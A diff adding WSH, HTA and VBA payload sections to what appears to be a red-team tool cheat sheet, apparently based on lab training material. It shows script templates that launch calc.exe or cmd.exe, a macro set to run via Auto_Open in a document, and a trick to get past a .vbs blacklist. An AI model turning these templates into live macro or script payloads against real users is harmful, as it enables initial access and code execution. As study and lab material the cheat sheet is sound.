@@ -13,6 +13,9 @@
     - AORT (All in One Recon Tool)
 2. [Resource Development](#resource-development)
     - msfvenom
+    - WSH
+    - HTA
+    - VBA
 3. [Initial Access](#initial-access)
     - EvilGoPhish
     - The Social-Engineer Toolkit
@@ -107,6 +110,53 @@ Resource Development
 	
 	![image](https://user-images.githubusercontent.com/100603074/192070870-2e65fc9f-6534-42e2-af27-9d8b54a82f0b.png)
 
+* WSH
+	
+	**Creating payload:** 
+	
+	```
+	Set shell = WScript.CreateObject("Wscript.Shell")
+	shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
+	```
+
+	**Execute:** 
+	
+	`c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs`
+	
+	`c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs`
+	
+	If .vbs are blacklisted `c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt`
+	
+* HTA
+
+	**Creating payload:**
+	
+	```
+	<html>
+	<body>
+	<script>
+		var c= 'cmd.exe'
+		new ActiveXObject('WScript.Shell').Run(c);
+	</script>
+	</body>
+	</html>
+	```
+	
+	**Execute:** Run file
+
+* VBA
+
+	**Creating payload:**
+
+	```
+	Sub calc()
+		Dim payload As String
+		payload = "calc.exe"
+		CreateObject("Wscript.Shell").Run payload,0
+	End Sub
+	```
+	
+	**Execute:** Set function to Auto_Open() in macro enabled document
 
 Initial Access
 ====================
